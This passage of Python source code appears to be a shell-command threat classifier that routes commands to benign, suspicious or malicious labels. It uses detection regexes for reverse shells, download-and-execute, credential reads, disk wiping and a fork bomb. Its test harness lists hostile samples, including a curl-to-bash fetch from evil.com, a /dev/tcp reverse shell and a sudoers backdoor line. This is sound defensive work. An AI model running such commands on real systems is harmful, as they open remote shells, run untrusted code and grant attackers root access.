                reason="Simple operational or health-check command with no strong security-risk features.",
                policy="benign_operational_override",
                features=features,
                should_run_specialist=True,
            )

        high_precision_benign = (
            features.get("has_local_artifact_inspection")
            or features.get("has_openssl_client_inspection")
            or features.get("has_routine_service_log_inspection")
            or features.get("has_container_readonly_admin")
            or (
                features.get("has_benign_archive_command")
                and features.get("has_benign_snapshot_source")
                and not features.get("has_sensitive_source")
            )
            or (
                features.get("has_controlled_remote_copy")
                and features.get("has_controlled_remote_target")
                and features.get("has_benign_snapshot_source")
                and not features.get("has_sensitive_source")
            )
        )

        if (
            high_precision_benign
            and not disallowed_benign_features
            and not forced_malicious_features
            and class_probs["Malicious"] < 0.52
        ):
            return self._build_route_result(
                label="Benign",
                label_confidence=max(class_probs["Benign"], 0.72),
                reason="High-precision operational admin workflow without attack-oriented indicators.",
                policy="benign_high_precision_override",
                features=features,
                should_run_specialist=True,
            )

        # Admin workflow override: commands matching known admin patterns
        # (ls, ps, ip addr, dig, history, env, docker ps, kubectl get, etc.)
        # without any threatening features get classified Benign.
        if (
            features.get("has_benign_admin_workflow")
            and not disallowed_benign_features
            and not forced_malicious_features
            and class_probs["Malicious"] < 0.45
        ):
            return self._build_route_result(
                label="Benign",
                label_confidence=max(class_probs["Benign"], 0.70),
                reason="Recognized admin workflow command with no attack-oriented indicators.",
                policy="benign_admin_workflow_override",
                features=features,
                should_run_specialist=True,
            )

        return None

    def _probability_route(
        self,
        top_label: str,
        weak_prediction: bool,
        class_probs: dict,
        features: dict,
        suspicious_signals: list[str],
        malicious_promotion_features: list[str],
    ) -> tuple[str, str, str]:
        if top_label == "Malicious" and (features.get("has_exploit_or_attack_tooling") or features.get("has_sensitive_source")):
            return (
                "Malicious",
                "Model and attack-oriented tooling or sensitive-source handling both indicate malicious activity.",
                "model_malicious_attack_tooling",
            )

        if top_label == "Malicious" and not weak_prediction:
            return (
                "Malicious",
                "Model strongly favors Malicious with a clear confidence margin.",
                "model_aligned_malicious",
            )

        if features.get("has_sensitive_source") and top_label != "Malicious":
            return (
                "Suspicious",
                "Sensitive-source access without a strong malicious verdict is routed to Suspicious for review.",
                "suspicious_sensitive_source_guardrail",
            )

        # Strong recon signals override Benign even with a single signal
        strong_recon_signals = {"has_enumeration_recon", "has_exfil_data_movement"}
        has_strong_recon = bool(set(suspicious_signals) & strong_recon_signals)

        if top_label == "Benign" and suspicious_signals and (weak_prediction or len(suspicious_signals) >= 2 or has_strong_recon):
            return (
                "Suspicious",
                "Benign model prediction is softened by dual-use security signals: " + ", ".join(suspicious_signals[:3]),
                "suspicious_dual_use_guardrail",
            )

        if top_label == "Malicious" and suspicious_fallback_enabled and weak_prediction and not malicious_promotion_features:
            return (
                "Suspicious",
                "Malicious model prediction was weak or low-margin without a strong attack-chain feature, so it falls back to Suspicious.",
                "suspicious_low_margin_fallback",
            )

        if top_label == "Suspicious":
            return (
                "Suspicious",
                "Model routes this command to Suspicious because the behavior remains dual-use or context dependent.",
                "model_aligned_suspicious",
            )

        if top_label == "Benign" and not weak_prediction:
            if suspicious_signals:
                return (
                    "Benign",
                    "Model still favors Benign with sufficient confidence despite limited dual-use indicators.",
                    "model_benign_with_caution",
                )
            return (
                "Benign",
                "Model strongly favors Benign and no security-significant features were detected.",
                "model_aligned_benign",
            )

        if suspicious_fallback_enabled:
            return (
                "Suspicious",
                "Model confidence was weak or ambiguous, so the command is routed to Suspicious for safer handling.",
                "suspicious_confidence_fallback",
            )

        return top_label, f"Using raw model top class {top_label}.", "model_top_class"

    def _should_run_specialist(
        self,
        final_label: str,
        class_probs: dict,
        high_risk: bool,
        features: dict,
        suspicious_signals: list[str],
    ) -> bool:
        # Always run the TF-IDF specialist to provide MITRE codes regardless
        # of gatekeeper label.  The TF-IDF model is lightweight (~90 ms) so
        # there is no meaningful latency cost.
        return True

    def _route_gatekeeper(self, gate: dict, features: dict, raw_cmd: str, deobfuscated_cmd: str | None = None) -> dict:
        hard_override = self._check_hard_overrides(raw_cmd, deobfuscated_cmd)
        class_probs = gate["class_probabilities"]
        top_label = gate["public_label"]
        top_conf = gate["label_conf"]
        margin = gate["decision_margin"]
        weak_prediction = top_conf < self._label_threshold(top_label) or margin < low_margin_threshold
        forced_malicious_features, malicious_promotion_features = self._malicious_promotion_features(features)
        suspicious_signals = self._suspicious_signals(features)
        high_risk = bool(hard_override or malicious_promotion_features)

        if high_risk_override_enabled and hard_override:
            return self._build_route_result(
                label="Suspicious" if hard_override["tag"] == "credential_file_read" and "/etc/passwd" in raw_cmd.lower() else "Malicious",
                label_confidence=max(class_probs["Malicious"], hard_override["confidence"]),
                reason=f"Forced malicious by deterministic high-risk pattern: {hard_override['tag']}",
                policy="hard_override",
                features=features,
                should_run_specialist=True,
            )

        if high_risk_override_enabled and malicious_promotion_features:
            # Check malicious cap before forcing malicious — some commands
            # (e.g. getfacl /etc/shadow) are risky but not definitively malicious.
            # Only cap when no forced_malicious_features (pipe_to_shell, reverse_shell, etc.)
            cap_views = [raw_cmd.lower().strip()]
            if deobfuscated_cmd:
                cap_views.append(deobfuscated_cmd.lower().strip())
            if not forced_malicious_features and any(self._MALICIOUS_CAP_TO_SUSPICIOUS_RE.search(v) for v in cap_views):
                return self._build_route_result(
                    label="Suspicious",
                    label_confidence=max(class_probs["Suspicious"], 0.78),
                    reason="Downgraded from Malicious: command is risky/non-standard but lacks definitive attack indicators.",
                    policy="malicious_to_suspicious_cap",
                    features=features,
                    should_run_specialist=True,
                )
            return self._build_route_result(
                label="Malicious",
                label_confidence=max(class_probs["Malicious"], 0.86),
                reason="Forced malicious by high-risk behavior: " + ", ".join(malicious_promotion_features[:3]),
                policy="feature_force_malicious",
                features=features,
                should_run_specialist=True,
            )

        benign_override = self._benign_safe_override(
            class_probs=class_probs,
            margin=margin,
            features=features,
            forced_malicious_features=forced_malicious_features,
        )
        if benign_override is not None:
            return benign_override

        final_label, reason, policy = self._probability_route(
            top_label=top_label,
            weak_prediction=weak_prediction,
            class_probs=class_probs,
            features=features,
            suspicious_signals=suspicious_signals,
            malicious_promotion_features=malicious_promotion_features,
        )

        # De-escalate Malicious → Suspicious for commands that are risky but
        # not definitively malicious (e.g. chmod 777, crontab -l, ls /etc/cron.d/).
        if final_label == "Malicious" and not forced_malicious_features:
            cap_views = [raw_cmd.lower().strip()]
            if deobfuscated_cmd:
                cap_views.append(deobfuscated_cmd.lower().strip())
            if any(self._MALICIOUS_CAP_TO_SUSPICIOUS_RE.search(v) for v in cap_views):
                final_label = "Suspicious"
                reason = "Downgraded from Malicious: command is risky/non-standard but lacks definitive attack indicators."
                policy = "malicious_to_suspicious_cap"

        specialist = self._should_run_specialist(
            final_label=final_label,
            class_probs=class_probs,
            high_risk=high_risk,
            features=features,
            suspicious_signals=suspicious_signals,
        )

        confidence_floor = {
            "Benign": 0.68,
            "Suspicious": 0.64,
            "Malicious": 0.74,
        }[final_label]
        label_confidence = max(class_probs[final_label], confidence_floor if policy != "model_top_class" else class_probs[final_label])

        return self._build_route_result(
            label=final_label,
            label_confidence=label_confidence,
            reason=reason,
            policy=policy,
            features=features,
            should_run_specialist=specialist,
        )

    # ── Hard-override patterns (unambiguously malicious, bypass gatekeeper) ──

    _HARD_OVERRIDE_PATTERNS = [
        # Base64-decode piped to shell interpreter
        (re.compile(
            r"""(?:echo|printf)\s+['"]?[A-Za-z0-9+/]{16,}={0,2}['"]?
               \s*\|\s*base64\s+-d\s*\|\s*(?:ba)?sh\b""",
            re.X | re.I,
        ), "encoded_payload_to_shell", 0.97),
        # curl / wget piped to shell interpreter
        (re.compile(
            r"(?:curl|wget)\s+.*\|\s*(?:ba)?sh\b", re.I,
        ), "download_and_execute", 0.96),
        # Reverse shell – bash /dev/tcp
        (re.compile(
            r"(?:ba)?sh\s+-i\s*>\s*&?\s*/dev/tcp/", re.I,
        ), "reverse_shell_dev_tcp", 0.98),
        # Reverse shell – netcat exec
        (re.compile(
            r"\bnc(?:at)?\b.*-e\s*/bin/(?:ba)?sh\b", re.I,
        ), "reverse_shell_nc", 0.98),
        # Credential harvesting – direct reads of highly sensitive files
        (re.compile(
            r"\b(?:cat|less|more|head|tail|tac|nl|xxd|strings)\s+/etc/(?:shadow|sudoers)\b",
            re.I,
        ), "credential_file_read", 0.95),
        # mkfifo reverse shell
        (re.compile(
            r"mkfifo\s+.*\bnc(?:at)?\b.*(?:ba)?sh\b", re.I | re.S,
        ), "reverse_shell_mkfifo", 0.98),
        # Disk destruction / filesystem wipe
        (re.compile(
            r"\bdd\b.*(?:if=/dev/(?:zero|urandom|null)).*(?:of=/dev/(?:sd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|vd[a-z]\d*))",
            re.I,
        ), "disk_destruction_dd", 0.99),
        (re.compile(
            r"\bmkfs(?:\.[a-z0-9_+-]+)?\b\s+/dev/(?:sd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|vd[a-z]\d*)",
            re.I,
        ), "filesystem_format", 0.99),
        # Exfiltration of local file content via HTTP upload (only sensitive files)
        (re.compile(
            r"\bcurl\b.*(?:-x\s+post|-xpost|--request\s+post|--request=post|\bpost\b).*(?:-d\s+@|--data\s+@|--data-binary\s+@|--form\s+@|--form-string\s+@)\s*/(?:etc/(?:shadow|sudoers|passwd)|root/\.ssh|home/[^\s]+/\.ssh|proc/\d+/environ)",
            re.I,
        ), "http_file_exfiltration", 0.97),
        # Additional reverse shell variants missed by the gatekeeper
        (re.compile(
            r"\bruby\b.*tcpsocket\.open\([^)]*\).*exec\s+sprintf\([^)]*/bin/(?:ba)?sh",
            re.I,
        ), "reverse_shell_ruby", 0.98),
        (re.compile(
            r"\bopenssl\s+s_client\b.*\|\s*/bin/(?:ba)?sh\b",
            re.I,
        ), "reverse_shell_openssl", 0.98),
        (re.compile(
            r":\(\)\s*\{\s*:\|:&\s*\};:",
            re.I,
        ), "fork_bomb", 0.99),
    ]

    def _check_hard_overrides(self, raw_cmd, deobfuscated_cmd):
        """Return an override dict if a deterministic pattern matches, else None."""
        for rx, tag, conf in self._HARD_OVERRIDE_PATTERNS:
            if rx.search(raw_cmd) or (deobfuscated_cmd and rx.search(deobfuscated_cmd)):
                return {"tag": tag, "confidence": conf}
        return None

    def scan(self, raw_cmd):
        current_cmd = raw_cmd.strip()
        was_obfuscated = self.is_obfuscated(current_cmd)

        prev_entropy = self.calculate_entropy(current_cmd)

        for _ in range(self.max_deobfuscation_layers):
            if self.is_obfuscated(current_cmd):
                new_cmd = self.deobfuscate_layer(current_cmd)
                if new_cmd == current_cmd:
                    break
                current_cmd = new_cmd

                new_entropy = self.calculate_entropy(current_cmd)
                if abs(prev_entropy - new_entropy) < 0.01:
                    break
                prev_entropy = new_entropy
            else:
                break

        processed_cmd = current_cmd.lower().strip()
        inputs = self.tokenizer(
            processed_cmd,
            return_tensors="pt",
            truncation=True,
            padding="max_length",
            max_length=self.max_length,
        ).to(self.device)

        # When the command was deobfuscated, also tokenize the raw form so we
        # can run the gatekeeper on both and take the worse (higher-malicious)
        # score.  This ensures base64-wrapped payloads get properly classified
        # because the model sees the decoded plaintext.
        raw_inputs = None
        if was_obfuscated:
            raw_processed = raw_cmd.strip().lower()
            if raw_processed != processed_cmd:
                raw_inputs = self.tokenizer(
                    raw_processed,
                    return_tensors="pt",
                    truncation=True,
                    padding="max_length",
                    max_length=self.max_length,
                ).to(self.device)

        device_type = "cuda" if "cuda" in self.device.type else "cpu"
        autocast_dtype = torch.float16 if device_type == "cuda" else torch.bfloat16

        with torch.no_grad():
            with autocast(device_type=device_type, dtype=autocast_dtype):
                g_logits = self.t1(inputs["input_ids"], inputs["attention_mask"])
                g_probs = F.softmax(g_logits, dim=1)
                raw_g_probs = None

                if raw_inputs is not None:
                    raw_g_logits = self.t1(raw_inputs["input_ids"], raw_inputs["attention_mask"])
                    raw_g_probs = F.softmax(raw_g_logits, dim=1)

                gate = self._select_gate_summary(g_probs, raw_g_probs)
                routing_features = self._extract_routing_features(
                    raw_cmd.strip(),
                    current_cmd if was_obfuscated else None,
                )
                routed = self._route_gatekeeper(
                    gate,
                    routing_features,
                    raw_cmd.strip(),
                    current_cmd if was_obfuscated else None,
                )

                raw_probabilities = {
                    "Benign": round(gate["class_probabilities"]["Benign"] * 100, 2),
                    "Suspicious": round(gate["class_probabilities"]["Suspicious"] * 100, 2),
                    "Malicious": round(gate["class_probabilities"]["Malicious"] * 100, 2),
                }

                response = {
                    "label": routed["label"],
                    "label_confidence": round(routed["label_confidence"] * 100, 2),
                    "class_probabilities": raw_probabilities,
                    "label_probabilities": {
                        "benign": raw_probabilities["Benign"],
                        "malicious": raw_probabilities["Malicious"],
                        "context_dependent": raw_probabilities["Suspicious"],
                        "suspicious": raw_probabilities["Suspicious"],
                    },
                    "decision_margin": round(gate["decision_margin"] * 100, 2),
                    "reason": routed["reason"],
                    "triggered_features": routed["triggered_features"],
                    "routing_policy": routed["routing_policy"],
                    "should_run_specialist": routed["should_run_specialist"],
                    "gatekeeper": {
                        "decision_mode": routed["routing_policy"],
                        "model_top_label": gate["public_label"],
                        "model_top_confidence": round(gate["label_conf"] * 100, 2),
                        "model_second_label": gate["second_public_label"],
                        "model_second_confidence": round(gate["second_conf"] * 100, 2),
                        "model_view": gate.get("model_view"),
                        "thresholds": {
                            "benign_conf_threshold": benign_conf_threshold,
                            "suspicious_conf_threshold": suspicious_conf_threshold,
                            "malicious_conf_threshold": malicious_conf_threshold,
                            "low_margin_threshold": low_margin_threshold,
                            "high_risk_override_enabled": high_risk_override_enabled,
                            "suspicious_fallback_enabled": suspicious_fallback_enabled,
                        },
                        "threshold_source": self.gatekeeper_threshold_source,
                    },
                    "evidence": {
                        "triggered_features": routed["triggered_features"],
                        "routing_reason": routed["reason"],
                        "routing_policy": routed["routing_policy"],
                    },
                    "deobfuscated_cmd": current_cmd if was_obfuscated else None,
                }

                if routed["label"] == "Context_Dependent":
                    response["action"] = "requires_context"

                if routed["should_run_specialist"]:
                    t2_text, rule_result = self._build_variant_a_text(raw_cmd.strip())

                    # TF-IDF specialist inference
                    tfidf_proba = self.t2.predict_proba([t2_text])[0]
                    top3_pos = tfidf_proba.argsort()[-3:][::-1]
                    raw_codes = [
                        {
                            "code": self._tfidf_idx_to_label.get(int(self.t2.classes_[i]), "?"),
                            "confidence": round(float(tfidf_proba[i]) * 100, 2),
                        }
                        for i in top3_pos
                        if self._tfidf_idx_to_label.get(int(self.t2.classes_[i]))
                    ]

                    deob_codes = []
                    deob_rule_result = None
                    payload_for_t2 = None
                    if was_obfuscated and current_cmd != raw_cmd.strip():
                        decoded_payload = None
                        b64m = self._SHELL_B64_PIPE_RE.search(raw_cmd.strip())
                        if b64m:
                            try:
                                decoded_payload = base64.b64decode(b64m.group(1)).decode("utf-8", errors="ignore")
                            except Exception:
                                pass
                        if not decoded_payload:
                            enc_m = self._ENCODED_CMD_RE.search(raw_cmd.strip())
                            if enc_m:
                                try:
                                    _raw_b = base64.b64decode(enc_m.group(1))
                                    try:
                                        decoded_payload = _raw_b.decode("utf-16-le")
                                    except Exception:
                                        decoded_payload = _raw_b.decode("utf-8", errors="ignore")
                                except Exception:
                                    pass
                        payload_for_t2 = decoded_payload or current_cmd

                        try:
                            deob_t2_text, deob_rule_result = self._build_variant_a_text(payload_for_t2)

                            # TF-IDF inference on deobfuscated payload
                            deob_proba = self.t2.predict_proba([deob_t2_text])[0]
                            deob_top3_pos = deob_proba.argsort()[-3:][::-1]
                            deob_codes = [
                                {
                                    "code": self._tfidf_idx_to_label.get(int(self.t2.classes_[i]), "?"),
                                    "confidence": round(float(deob_proba[i]) * 100, 2),
                                }
                                for i in deob_top3_pos
                                if self._tfidf_idx_to_label.get(int(self.t2.classes_[i]))
                            ]
                        except Exception:
                            deob_codes = []

                    merged = {}
                    for entry in raw_codes + deob_codes:
                        code = entry["code"]
                        if code not in merged or entry["confidence"] > merged[code]["confidence"]:
                            merged[code] = entry
                    # Sort by confidence descending, cap at 5
                    response["MITRE_codes"] = sorted(
                        merged.values(), key=lambda e: e["confidence"], reverse=True
                    )[:5]

                    if was_obfuscated and deob_codes and payload_for_t2:
                        response["decoded_payload"] = payload_for_t2
                        response["payload_mitre_codes"] = deob_codes

                    ev_rule = rule_result
                    if deob_rule_result is not None:
                        deob_fired = len(deob_rule_result.get("fired_rules", []))
                        raw_fired = len((rule_result or {}).get("fired_rules", []))
                        if deob_fired > raw_fired:
                            ev_rule = deob_rule_result
                    if self.use_residual_format and (rule_result is not None or ev_rule is not None):
                        try:
                            _parsed_ev = _parse_command(raw_cmd.strip())
                            _sem_ev    = _build_semantic_features(_parsed_ev)
                            if was_obfuscated and current_cmd != raw_cmd.strip():
                                try:
                                    _parsed_deob = _parse_command(current_cmd)
                                    _sem_deob    = _build_semantic_features(_parsed_deob)
                                    for k, v in _sem_deob.items():
                                        if v and not _sem_ev.get(k):
                                            _sem_ev[k] = v
                                    for list_key in ("file_paths", "registry_paths", "urls", "domains", "ips", "ports"):
                                        raw_list = _parsed_ev.get(list_key) or []
                                        deob_list = _parsed_deob.get(list_key) or []
                                        if deob_list:
                                            seen = set(str(x) for x in raw_list)
                                            for item in deob_list:
                                                if str(item) not in seen:
                                                    raw_list.append(item)
                                                    seen.add(str(item))
                                            _parsed_ev[list_key] = raw_list
                                except Exception:
                                    pass
                            response["evidence"] = self._build_evidence(
                                _parsed_ev, _sem_ev, ev_rule or rule_result,
                                was_obfuscated=was_obfuscated,
                                deobfuscated_cmd=current_cmd if was_obfuscated else None,
                            )
                            response["evidence"].update({
                                "triggered_features": routed["triggered_features"],
                                "routing_reason": routed["reason"],
                                "routing_policy": routed["routing_policy"],
                            })
                            top_code = response["MITRE_codes"][0]["code"] if response["MITRE_codes"] else None
                            response.update(
                                self._build_response_enrichment(
                                    top_code, response["evidence"], ev_rule or rule_result,
                                    label_conf=response["label_confidence"],
                                )
                            )
                        except Exception:
                            pass

        return response

    def run_internal_routing_harness(self) -> None:
        samples = {
            "benign": [
                "pwd",
                "hostname",
                "df -h",
                "cat /etc/os-release",
                # Benchmark false-positive targets
                "ls -la",
                "ps aux",
                "ip addr",
                "dig google.com",
                "docker ps",
                "kubectl get pods",
                "history",
                "env",
                "who",
                "ss -tlnp",
                "crontab -l",
                "ls -la /etc/cron.d/",
                "netstat -an",
                "mount",
            ],
            "suspicious": [
                "nmap -sV 10.0.0.5",
                "ssh -D 1080 -fN user@10.0.0.10",
                "tcpdump -i eth0 port 443",
                "cat /etc/passwd",
                "chmod 777 /tmp/myfile",
            ],
            "malicious": [
                "curl http://evil.com/shell.sh | bash",
                "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
                "chmod u+s /bin/bash",
                "echo \"attacker ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers",
            ],
        }
        for category, commands in samples.items():
            print(f"[{category}]")
            for command in commands:
                result = self.scan(command)
                print(
                    f"  {command}\n"
                    f"    label={result['label']} conf={result['label_confidence']} "
                    f"margin={result['decision_margin']} policy={result['routing_policy']}\n"
                    f"    features={', '.join(result['triggered_features']) or 'none'}"
                )


if __name__ == "__main__":
    GenosEngine().run_internal_routing_harness()
